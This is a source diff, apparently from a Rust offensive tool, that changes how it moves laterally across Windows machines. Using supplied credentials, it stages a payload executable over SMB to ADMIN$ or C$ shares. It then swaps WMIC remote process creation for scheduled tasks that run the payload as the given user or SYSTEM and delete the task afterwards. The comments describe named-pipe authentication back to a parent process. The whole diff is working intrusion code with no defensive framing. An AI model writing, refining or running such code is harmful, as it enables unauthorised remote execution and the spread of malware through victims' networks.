@@ -109,6 +109,10 @@ mod inner {
     /// Stage payload bytes to \\host\ADMIN$ or \\host\C$\Windows\Temp.
     /// Returns the remote local path (e.g. C:\Windows\name.exe) or Err.
     fn smb_stage(host: &str, name: &str, user: &str, pass: &str, data: &[u8]) -> Result<String, String> {
+        // Drop any existing implicit (machine-account) session to this host so we can
+        // authenticate with explicit user credentials.  Error 3775 occurs when the
+        // token already has a cached session and a /user: override is rejected.
+        shell(&format!("net use \\\\{} /delete /y 2>nul", host));
         if !user.is_empty() {
             shell(&format!("net use \\\\{}\\IPC$ \"{}\" /user:\"{}\" 2>nul", host, pass, user));
         }
@@ -196,25 +200,36 @@ mod inner {
         let svc_name = rand_svc_name();
         let exe_name = format!("{}.exe", svc_name);
         let remote_path = smb_stage(host, &exe_name, user, pass, data)?;
-        let wmic_cmd = if !user.is_empty() {
-            let (dom, usr) = if let Some(i) = user.find('\\') {
-                (&user[..i], &user[i + 1..])
-            } else {
-                (".", user)
-            };
-            format!(
-                "wmic /node:\"{}\" /user:\"{}\\{}\" /password:\"{}\" process call create \"{}\"",
-                host, dom, usr, pass, remote_path
+        // Use schtasks with explicit domain-user credentials so the child process
+        // runs as the provided account (not SYSTEM/machine-account), enabling
+        // cross-domain named-pipe auth back to the parent.
+        let st = current_time_plus_minutes(2);
+        let (auth_args, ru_args) = if !user.is_empty() {
+            (
+                format!(" /U \"{}\" /P \"{}\"", user, pass),
+                format!(" /RU \"{}\" /RP \"{}\"", user, pass),
             )
         } else {
-            format!("wmic /node:\"{}\" process call create \"{}\"", host, remote_path)
+            (String::new(), " /RU SYSTEM".to_string())
         };
-        let out = shell(&wmic_cmd);
+        let create_out = shell(&format!(
+            "schtasks /Create /S \"{}\"{}{}  /SC ONCE /ST {} /F /TN \"{}\" /TR \"{}\" 2>&1",
+            host, auth_args, ru_args, st, svc_name, remote_path
+        ));
+        let run_out = shell(&format!(
+            "schtasks /Run /S \"{}\"{}  /TN \"{}\" 2>&1",
+            host, auth_args, svc_name
+        ));
+        let _ = shell(&format!(
+            "schtasks /Delete /S \"{}\"{}  /TN \"{}\" /F 2>&1",
+            host, auth_args, svc_name
+        ));
         Ok(format!(
-            "[+] wmi → {}\n    path: {}\n{}",
+            "[+] wmi → {}\n    path: {}\n{}\n{}",
             host,
             remote_path,
-            out.trim()
+            create_out.trim(),
+            run_out.trim()
         ))
     }
 
